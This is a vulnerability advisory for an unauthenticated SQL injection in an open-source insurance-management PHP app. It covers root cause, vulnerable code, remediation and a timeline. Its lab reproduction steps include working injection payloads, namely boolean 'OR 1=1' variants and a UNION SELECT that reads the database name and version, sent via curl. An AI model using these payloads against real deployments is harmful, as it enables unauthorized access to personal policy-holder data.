# TTA-2026-005: Insurance-Management-System unauthenticated SQL injection in EditPolicyHolder.php (CVE-2026-114243)

**Severity: High** — CNA-assigned CVSS 3.1: 7.3 (`AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L`)

### Title

Unauthenticated SQL injection in `EditPolicyHolder.php` allows a remote caller to alter the policy-holder query.

### Summary

`Insurance_Management_System/Agent/ManagePolicy/EditPolicyHolder.php` concatenates the user-controlled `Policy_no` and `Name` GET parameters directly into a SQL query passed to `mysqli_query()`. The page includes `Agent/header.php`, but that header only sends a redirect when an agent session is absent; it does not terminate request processing. As a result, an unauthenticated remote user can still reach and manipulate the vulnerable query.


### Affected Version

- Vendor: dhikshitha29
- Product: Insurance-Management-System
- Affected component: `Agent/ManagePolicy/EditPolicyHolder.php`
- Affected parameters: `Policy_no`, `Name`
- Confirmed vulnerable code commit: `125362cc21dca20d74091a4913a5096bb58dd837`
- Fixed version: none known

The official CVE record lists both `91de5edda5baa109ad8e9baf03ce6a3ceda84183` and `125362cc21dca20d74091a4913a5096bb58dd837` as affected. The first SHA is an initial commit containing only `README.md`; the vulnerable application code first appears in the second SHA. This advisory preserves the CNA metadata while identifying the commit that actually contains the affected file.


### Vulnerability Type

SQL Injection (CWE-89) combined with missing authentication enforcement.

### Affected Code

File: `Agent/ManagePolicy/EditPolicyHolder.php`.

Affected inputs: `Policy_no` and `Name`, which are concatenated into the query passed to `mysqli_query()`.

### Root Cause

Two flaws make the endpoint remotely exploitable without authentication:

- user input is concatenated directly into SQL rather than bound through a prepared statement; and
- the authentication guard sends a redirect but does not terminate execution.


### Steps to Reproduce

The following validation uses only synthetic data in an isolated laboratory deployment of commit `125362cc21dca20d74091a4913a5096bb58dd837`.

1. Deploy the repository on PHP 7.x with MySQL or MariaDB. The original project targets Windows/XAMPP; on another platform, adjust the hard-coded include path in the test copy so it resolves to the local `database.php`.
2. Set `BASE_URL` to the local application directory containing `index.php`, for example `http://127.0.0.1/Insurance-Management-System`.
3. Create the local database and one synthetic row:

   ```sql
   CREATE DATABASE l7;
   USE l7;
   CREATE TABLE Policy_holder (
     Policy_no INT PRIMARY KEY,
     Name VARCHAR(255), Mobile_no VARCHAR(20), Email_id VARCHAR(255),
     City VARCHAR(255), Colony VARCHAR(255), House_no VARCHAR(255),
     Pincode VARCHAR(20), Nominee_name VARCHAR(255),
     Nominee_relation VARCHAR(255), Gender VARCHAR(10),
     Occupation VARCHAR(255), DOB DATE, Edu_ql VARCHAR(255), AGE INT
   );
   INSERT INTO Policy_holder VALUES
   (100000001, 'John Doe', '9000000000', 'john@test.local',
    'Pune', 'Colony A', '12', '411001', 'Jane Doe', 'Spouse',
    'MALE', 'Engineer', '1989-06-15', 'B.E.', 35);
   ```

4. Confirm the baseline row:

   ```sql
   SELECT Policy_no, Name, Email_id, City
   FROM Policy_holder WHERE Policy_no = 100000001;
   ```

5. Confirm the normal lookup finds the synthetic row when both values match:

   ```bash
   curl -sS -G "$BASE_URL/Agent/ManagePolicy/EditPolicyHolder.php" \
     --data-urlencode 'Policy_no=100000001' \
     --data-urlencode 'Name=John Doe' \
     -o baseline.html
   rg -c 'UPDATE POLICY HOLDER' baseline.html
   ```

   Expected baseline output: `1`.

6. Without creating a PHP session, request the same row with a deliberately incorrect name. The normal lookup should not render the edit form:

   ```bash
   curl -sS -G "$BASE_URL/Agent/ManagePolicy/EditPolicyHolder.php" \
     --data-urlencode 'Policy_no=100000001' \
     --data-urlencode 'Name=NotTheCanary' \
     -o wrong-name.html
   rg -c 'UPDATE POLICY HOLDER' wrong-name.html
   ```

   Expected control output: `0`.

7. Send a boolean expression in the numeric `Policy_no` context. Run this only against the local clone:

   ```bash
   curl -sS -G \
     --data-urlencode 'Policy_no=100000001 OR 1=1' \
     --data-urlencode 'Name=NotTheCanary' \
     "$BASE_URL/Agent/ManagePolicy/EditPolicyHolder.php" \
     -o boolean-numeric.html
   rg -c 'UPDATE POLICY HOLDER' boolean-numeric.html
   ```

   Vulnerable result: output `1`; query-controlled input causes the synthetic row to be returned despite the wrong name.

8. Repeat with a string-context boolean canary and nonexistent policy number:

   ```bash
   curl -sS -G \
     --data-urlencode 'Policy_no=999999999' \
     --data-urlencode "Name=x' OR '1'='1" \
     "$BASE_URL/Agent/ManagePolicy/EditPolicyHolder.php" \
     -o boolean-string.html
   rg -c 'UPDATE POLICY HOLDER' boolean-string.html
   ```

   Vulnerable result: output `1`; the canary row is selected even though the supplied policy number does not exist.

9. The `Name` parameter also supports a lab-only metadata canary. The query selects 15 columns, so use a matching synthetic projection and read only the local test database name/version:

   ```bash
   curl -sS -G "$BASE_URL/Agent/ManagePolicy/EditPolicyHolder.php" \
     --data-urlencode 'Policy_no=999999999' \
     --data-urlencode "Name=x' UNION SELECT 1,database(),version(),4,5,6,7,8,9,10,11,12,13,14,15 -- -" \
     -o union-canary.html
   rg -o 'name="Name"[^>]*value="[^"]*"' union-canary.html
   ```

   Vulnerable result: the rendered `Name` field reflects the local database metadata (for example, `l7`). Do not use this technique to enumerate tables or retrieve records.

10. Confirm the synthetic database row was not changed by these read-only lookup tests, and stop. Do not run file-read, stacked-query, destructive, or data-extraction payloads against any public or production host.

The POST-based arbitrary-record modification caused by the related missing authorization check is documented separately in TTA-2026-015. Keep the two findings distinct: this advisory tests SQL query manipulation in the edit lookup; TTA-2026-015 tests an unauthenticated update operation.


### Impact

An unauthenticated attacker can alter the intended database query and access policy-holder records outside the application's authorization boundary. Depending on the database account's privileges and server configuration, SQL injection may also permit broader disclosure or modification of application data.

The CNA-assigned CVSS v3.1 score models partial confidentiality, integrity, and availability impact. This advisory does not claim a higher impact without separate verification.


### CVSS

- CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
- CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')
- CNA CVSS 3.1: 7.3 High — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:X/RC:C`
- CNA-reported CVSS 4.0: 6.9 Medium — `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N/E:P`

The CNA's CVSS 3.1 score is used as the primary severity value here. Consumers should recalculate the CVSS 4.0 vector with their chosen scoring implementation rather than treating the CNA-reported numeric value as independently verified.


## Status

TTA-2026-005 was published by the VulDB CNA on 2026-10-21 as CVE-2026-114243. The vulnerability was originally reported publicly to the upstream project on 2026-10-07. The upstream issue remains open, and no fixed version is known at the time of publication.

- Local advisory: `TTA-2026-005`
- CVE: `CVE-2026-114243`
- CVE state: `PUBLISHED`
- VulDB submission: `1018587`
- VulDB entry: `VDB-424678`
- Reporter: TypeThe0ry (VulDB User)

## Prerequisites

- Network access to a deployed affected application.
- No authenticated agent session is required.
- A functioning application database is required for the affected page to execute its query.

## Vulnerable code

The affected code directly interpolates both inputs into the query:

```php
$policy_no = $_GET['Policy_no'];
$name = $_GET['Name'];

$sql = "SELECT * FROM Policy_holder WHERE Policy_no = $policy_no AND Name = '$name'";
$result = mysqli_query($conn, $sql);
```

The included session check redirects an unauthenticated request but does not call `exit()` or otherwise stop execution before the vulnerable page continues.

## Recommended remediation

- Replace the interpolated query with a prepared statement and bound parameters.
- Validate `Policy_no` as an integer before database access.
- Enforce authentication and authorization before loading any policy-holder record.
- Terminate request processing after an authentication redirect; preferably centralize the guard so protected handlers cannot continue accidentally.
- Limit the database account to the minimum permissions required by the application.
- Add negative tests for unauthenticated access and SQL metacharacters in both parameters.

## Timeline

- 2026-10-07: Public upstream issue opened with reproduction details.
- 2026-10-21: VulDB published VDB-424678 and CVE-2026-114243.
- 2026-10-24: This repository advisory was published as TTA-2026-005.

## References

- [CVE Program record](https://www.cve.org/CVERecord?id=CVE-2026-114243)
- [CVE List V5 record](https://raw.githubusercontent.com/CVEProject/cvelistV5/main/cves/2026/114xxx/CVE-2026-114243.json)
- [VulDB entry VDB-424678](https://vuldb.com/vuln/424678)
- [VulDB submission 1018587](https://vuldb.com/submit/1018587)
- [Original upstream report and public proof of concept](https://github.com/dhikshitha29/Insurance-Management-System/issues/3)
- [Affected source at the confirmed code commit](https://github.com/dhikshitha29/Insurance-Management-System/blob/125362cc21dca20d74091a4913a5096bb58dd837/Insurance_Management_System/Agent/ManagePolicy/EditPolicyHolder.php)
- [Incomplete authentication guard at the confirmed code commit](https://github.com/dhikshitha29/Insurance-Management-System/blob/125362cc21dca20d74091a4913a5096bb58dd837/Insurance_Management_System/Agent/header.php#L4-L8)

## Evidence boundary

The published reproduction uses an isolated local deployment and synthetic database records. This advisory contains no production hostname, IP address, credential, session value, or real personal data.
